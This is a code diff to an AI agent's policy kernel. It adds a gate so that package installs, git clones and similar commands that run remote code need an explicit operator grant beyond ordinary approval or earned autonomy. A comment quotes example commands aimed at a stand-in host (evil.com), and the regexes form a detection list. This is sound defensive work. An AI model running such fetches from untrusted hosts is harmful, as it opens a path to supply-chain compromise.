@@ -45,6 +45,57 @@ class RouteAuthority:
     policy_version: str = "v1"
 
 
+#: Commands that FETCH AND EXECUTE remote code. Each of these runs
+#: attacker-controlled code as an ordinary part of doing its job -- `pip` runs
+#: setup.py, `npm` runs postinstall hooks, `git clone` can carry hooks and
+#: submodules -- so authorising "run a command" must not authorise them.
+#:
+#: INVARIANT IV, measured 2026-09-06 and unchanged since 16 August:
+#:     YELLOW  pip install evil-pkg
+#:     YELLOW  npm install evil-pkg
+#:     YELLOW  git clone https://evil.com/x.git
+#:     RED     curl https://evil.com
+#: The three most common supply-chain RCE vectors were one approval away while
+#: the obvious one was hard-blocked -- and earned autonomy could clear them with
+#: NO approval at all.
+#:
+#: This gate lives in the KERNEL, above the gateway, because
+#: `aios/security/gateway.py` is frozen (AGENTS.md VIII): its `_CAUTION_PATTERNS`
+#: classification is deliberately untouched here. A proposal to carry this
+#: natively in the gateway belongs in a section-VIII amendment, not in this file.
+_NETWORK_FETCH_PATTERNS: tuple[re.Pattern[str], ...] = tuple(
+    re.compile(p, re.IGNORECASE)
+    for p in (
+        r"\b(?:python\s+-m\s+)?pip\d?\s+install\b",
+        r"\buv\s+pip\s+install\b",
+        r"\buvx?\s+(?:add|tool\s+install)\b",
+        r"\bnpm\s+(?:install|i|ci|add)\b",
+        r"\b(?:pnpm|yarn|bun)\s+(?:install|add)\b",
+        r"\bnpx\s+",
+        r"\bgit\s+clone\b",
+        r"\bgit\s+submodule\s+(?:update|add)\b",
+        r"\bcargo\s+install\b",
+        r"\bgo\s+(?:get|install)\b",
+        r"\bgem\s+install\b",
+        r"\bpoetry\s+add\b",
+        r"\bconda\s+install\b",
+    )
+)
+
+#: Capability name reported on a decision that needs the operator grant.
+NETWORK_FETCH_CAPABILITY = "network.fetch"
+
+
+def requires_network_capability(command: str) -> bool:
+    """True when *command* fetches and executes remote code.
+
+    Deliberately independent of the gateway's zone: this asks "does this reach
+    out and run someone else's code", which is a different question from "how
+    destructive is it locally".
+    """
+    return any(pattern.search(command or "") for pattern in _NETWORK_FETCH_PATTERNS)
+
+
 @dataclass(frozen=True)
 class AuthorityDecision:
     allowed: bool = False
@@ -53,6 +104,9 @@ class AuthorityDecision:
     zone: Zone = Zone.RED
     reason: str = ""
     command: str = ""
+    #: Capability the caller must hold for this command, when an ordinary
+    #: approval is not sufficient on its own (see NETWORK_FETCH_CAPABILITY).
+    capability_required: Optional[str] = None
     #: WHICH control produced this decision, when it is a refusal.
     #:
     #: Before 2026-09-03 a refusal carried only a free-text `reason`, so
@@ -1028,7 +1082,16 @@ class PolicyKernelAuthority:
                 control="security_gateway",
             )
         if decision.status == "REQUIRE_HUMAN":
-            if self.autonomy.is_earned(
+            # EARNED AUTONOMY MUST NOT REACH THE NETWORK.
+            #
+            # `pip install`, `npm install` and `git clone` are YELLOW, and
+            # earned autonomy promotes a repeatedly-clean YELLOW class to
+            # automatic. So a supply-chain fetch could run with NO approval at
+            # all -- strictly worse than the "one approval away" this gate was
+            # written for. Whatever the agent has earned locally says nothing
+            # about whether a remote package is safe to execute.
+            fetches_remote_code = requires_network_capability(command)
+            if not fetches_remote_code and self.autonomy.is_earned(
                 "command", command, enabled=self.earned_autonomy_enabled()
             ):
                 return AuthorityDecision(
@@ -1040,8 +1103,17 @@ class PolicyKernelAuthority:
             return AuthorityDecision(
                 requires_approval=True,
                 zone=decision.zone,
-                reason=decision.reason,
+                reason=(
+                    f"{decision.reason} -- and this command fetches and executes "
+                    f"remote code, so it also requires the "
+                    f"{NETWORK_FETCH_CAPABILITY} grant"
+                    if fetches_remote_code
+                    else decision.reason
+                ),
                 command=command,
+                capability_required=(
+                    NETWORK_FETCH_CAPABILITY if fetches_remote_code else None
+                ),
             )
         return AuthorityDecision(
             allowed=True, zone=decision.zone, reason=decision.reason, command=command
@@ -1066,6 +1138,31 @@ class PolicyKernelAuthority:
                 reason=f"Human approval cannot authorise a RED action: {result.reason}",
                 command=command,
                 control="execute_approved",
+            )
+        # APPROVING "RUN A COMMAND" IS NOT APPROVING "FETCH AND RUN THEIR CODE".
+        #
+        # This is the second half of the gate: `evaluate_action` refuses to let
+        # earned autonomy clear a fetch, and this refuses to let an ordinary
+        # human approval clear one either. The operator must ALSO have granted
+        # `network.fetch` (AIOS_ALLOW_NETWORK_FETCH) -- two independent acts, so
+        # a dependency install stays possible but never incidental.
+        #
+        # Deliberately NOT straight to RED: RED would remove deliberate installs
+        # entirely. Fail-closed by default, openable on purpose.
+        if requires_network_capability(command) and not getattr(
+            config, "ALLOW_NETWORK_FETCH", False
+        ):
+            return AuthorityDecision(
+                blocked=True,
+                zone=result.zone,
+                reason=(
+                    "Human approval alone cannot authorise fetching and executing "
+                    f"remote code; the {NETWORK_FETCH_CAPABILITY} grant is required "
+                    "(set AIOS_ALLOW_NETWORK_FETCH)"
+                ),
+                command=command,
+                control="network_capability",
+                capability_required=NETWORK_FETCH_CAPABILITY,
             )
         return AuthorityDecision(
             allowed=True, zone=result.zone, reason="approved", command=command
